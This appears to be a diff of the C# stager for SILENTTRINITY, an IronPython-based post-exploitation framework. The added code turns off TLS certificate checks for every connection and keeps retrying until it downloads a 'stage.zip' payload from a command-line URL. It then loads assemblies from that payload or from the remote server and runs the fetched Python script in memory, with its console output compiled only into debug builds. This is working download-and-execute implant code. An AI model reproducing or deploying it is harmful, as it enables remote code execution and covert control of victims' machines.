@@ -1,128 +1,165 @@
 ﻿using System;
-using IronPython.Hosting;
-using IronPython.Modules;
-//using IronPython.Runtime;
+using System.Threading;
 using System.IO;
 using System.IO.Compression;
-using System.Linq;
 using System.Reflection;
-using Microsoft.Scripting.Hosting;
-//using Microsoft.Scripting.Utils;
-using System.Collections.Generic;
+using System.Net;
+using IronPython.Hosting;
+//using System.Net.WebSockets;
+//using IronPython.Runtime.Operations;
 
-namespace SILENTTRINITY
+public class ST
 {
-
-    public class Runtime
+    static ST()
     {
-
-        // https://mail.python.org/pipermail/ironpython-users/2012-December/016366.html
-        // http://ironpython.net/blog/2012/07/07/whats-new-in-ironpython-273.html
-        // https://blog.adamfurmanek.pl/2017/10/14/sqlxd-part-22/
-
-        public dynamic CreateEngine()
+        ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
+        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
+    }
+    static Byte[] Download(Uri URL)
+    {
+        while (true)
         {
-            ScriptRuntimeSetup setup = Python.CreateRuntimeSetup(options: GetRuntimeOptions());
-            var pyRuntime = new ScriptRuntime(setup);
-            ScriptEngine engineInstance = Python.GetEngine(pyRuntime);
-
-            AddPythonLibrariesToSysMetaPath(engineInstance);
-
-            return engineInstance;
-        }
-
-        public void AddPythonLibrariesToSysMetaPath(ScriptEngine engineInstance)
-        {
-            Assembly asm = GetType().Assembly;
-            var resQuery =
-                from name in asm.GetManifestResourceNames()
-                where name.ToLowerInvariant().Equals("stdlib.zip")
-                select name;
             try
             {
-                string resName = resQuery.Single();
-                Console.WriteLine("Found Python embedded stdlib: {0}", resName);
-                var importer = new ResourceMetaPathImporter(asm, resName);
-                dynamic sys = engineInstance.GetSysModule();
-                sys.meta_path.append(importer);
-                sys.path.append(importer);
-                //List metaPath = sys.GetVariable("meta_path");
-                //metaPath.Add(importer);
-                //sys.SetVariable("meta_path", metaPath);
-            }
-            catch
-            {
-                Console.WriteLine("Could not find Python embedded stdlib");
-            }
-        }
-
-        private IDictionary<string, object> GetRuntimeOptions()
-        {
-            var options = new Dictionary<string, object>
-            {
-                ["Debug"] = false
-            };
-            return options;
-        }
-
-        public static void DumpEmbeddedResources()
-        {
-            Console.WriteLine("Available embedded resources:");
-            string[] resourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
-            foreach (string resourceName in resourceNames)
-            {
-                Console.WriteLine("\t {0}", resourceName);
-            }
-            Console.WriteLine();
-        }
-
-        public static Byte[] GetAssemblyInZip(ZipArchive zip, string assemblyName)
-        {
-            Byte[] assemblyData = new Byte[0];
-
-            foreach (var entry in zip.Entries)
-            {
-                if (entry.Name == assemblyName + ".dll")
+                using (var wc = new WebClient())
                 {
-                    Console.WriteLine("Found {0}.dll in embedded resource zip file\n", assemblyName);
-                    using (var dll = entry.Open())
-                    {
-                        assemblyData = new Byte[entry.Length];
-                        dll.Read(assemblyData, 0, assemblyData.Length);
-                        return assemblyData;
-                    }
+                    var responseBody = wc.DownloadData(URL);
+#if DEBUG
+                    Console.WriteLine("Downloaded {0} bytes", responseBody.Length);
+#endif
+                    return responseBody;
                 }
             }
-            return assemblyData;
-        }
-
-        public static void Main(string[] args)
-        {
-
-            DumpEmbeddedResources();
-            String resourceZipFile = "SILENTTRINITY.Resources.dlls.zip";
-
-            ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceZipFile), ZipArchiveMode.Read);
-
-            AppDomain.CurrentDomain.AssemblyResolve += (sender, resourceargs) =>
+            catch (Exception e)
             {
-                String assemblyName = new AssemblyName(resourceargs.Name).Name;
-                Console.WriteLine("Trying to resolve {0}", assemblyName);
-
-                return Assembly.Load(GetAssemblyInZip(zip, assemblyName));
-            };
-
-            CreateRuntime();
+#if DEBUG
+                Console.WriteLine("Error downloading {0}: {1}", URL, e.Message);
+#endif
+                Thread.Sleep(5000);
+            }
+        }
+    }
+    static Byte[] Fetch(Uri URL, string Channel)
+    {
+        switch (Channel)
+        {
+            case "http":
+                return Download(URL);
+            default:
+                return new Byte[0];
+        }
+    }
+    public static Byte[] GetResourceInZip(ZipArchive zip, string resourceName)
+    {
+        foreach (var entry in zip.Entries)
+        {
+            if (entry.Name == resourceName)
+            {
+#if DEBUG
+                Console.WriteLine("Found {0} in initial stage", resourceName);
+#endif
+                using (var resource = entry.Open())
+                {
+                    var resdata = new Byte[entry.Length];
+                    resource.Read(resdata, 0, resdata.Length);
+                    return resdata;
+                }
+            }
+        }
+        return new Byte[0];
+    }
+    static ZipArchive Stage(Uri URL, string Channel)
+    {
+        while (true)
+        {
+            try
+            {
+                var memoryStream = new MemoryStream();
+                var StageURL = new Uri(URL, "stage.zip");
+                var data = Fetch(StageURL, Channel);
+                memoryStream.Write(data, 0, data.Length);
+                return new ZipArchive(memoryStream, ZipArchiveMode.Read);
+            }
+            catch (Exception e)
+            {
+#if DEBUG
+                Console.WriteLine("Error downloading stage: {0}", e.Message);
+#endif
+                Thread.Sleep(5000);
+            }
+        }
+    }
+    public static void CreateRuntime(Uri URL, string Channel, ZipArchive stage)
+    {
+        var engine = Python.CreateEngine();
+        var scope = engine.CreateScope();
+        scope.SetVariable("URL", URL.ToString());
+        scope.SetVariable("CHANNEL", Channel);
+        scope.SetVariable("IronPythonDLL", Assembly.Load(GetResourceInZip(stage, "IronPython.dll")));
+#if DEBUG
+        scope.SetVariable("DEBUG", true);
+#endif
+        var mainfile = GetResourceInZip(stage, "Main.py");
+        //result = PythonOps.InitializeModuleEx(Assembly.Load(GetResourceInZip(stage, "Main.dll")), "__main__", null, false, null);
+        engine.Execute(System.Text.Encoding.UTF8.GetString(mainfile, 0, mainfile.Length), scope);
+    }
+    public static void Main(string[] args)
+    {
+        string[] SupportedChannels = { "http" };
+        string Channel = "http";
+        Uri URL;
+ 
+        switch (args.Length)
+        {
+            case 2:
+                URL = new Uri(args[0]);
+                if (Array.IndexOf(SupportedChannels, args[1].ToLower()) >= 0)
+                {
+                    Channel = args[1].ToLower();
+                }
+                break;
+            case 1:
+                URL = new Uri(args[0]);
+                break;
+            default:
+                return;
         }
 
-        public static void CreateRuntime()
+#if DEBUG
+        Console.WriteLine("URL: {0}", URL);
+        Console.WriteLine("Channel: {0}", Channel);
+        Console.WriteLine();
+#endif
+        var stage = Stage(URL, Channel); 
+        AppDomain.CurrentDomain.AssemblyResolve += (sender, resargs) =>
         {
-            Runtime runtime = new Runtime();
+            string name = resargs.Name.Substring(0, resargs.Name.IndexOf(','));
+#if DEBUG
+            Console.WriteLine("Trying to resolve {0}.dll", name);
+#endif
+            try
+            {
+                return Assembly.Load(GetResourceInZip(stage, name + ".dll"));
+            }
+            catch (Exception e)
+            {
+#if DEBUG
+                Console.WriteLine("{0}.dll not found in initial stage: {1}", name, e.Message);
+#endif
+                return Assembly.Load(Fetch(new Uri(URL, name + ".dll"), Channel));
+            }
+        };
 
-            string myScript = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("SILENTTRINITY.Resources.Main.py")).ReadToEnd();
-            ScriptEngine engine = runtime.CreateEngine();
-            engine.Execute(myScript);
-
+        try
+        {
+            CreateRuntime(URL, Channel, stage);
+        }
+        catch (Exception e)
+        {
+#if DEBUG
+            Console.WriteLine("Error executing script in runtime: {0}", e.Message);
+            Console.WriteLine(e.ToString());
+#endif
         }
     }
 }
